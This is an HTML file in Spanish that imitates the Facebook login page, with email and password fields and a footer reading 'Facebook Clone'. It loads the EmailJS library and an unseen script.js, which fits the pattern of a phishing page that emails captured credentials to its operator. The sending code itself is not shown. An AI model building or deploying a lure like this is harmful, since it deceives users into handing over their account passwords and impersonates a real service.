<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Iniciar Sesión</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">facebook</div>
        <p class="description">Conéctate con amigos y el mundo que te rodea.</p>

        <div class="login-box">
            <form id="login-form">
                <input type="text" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            <div class="divider"></div>
            <button class="create-account">Crear cuenta nueva</button>
        </div>

        <p class="footer">© 2025 Facebook Clone</p>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
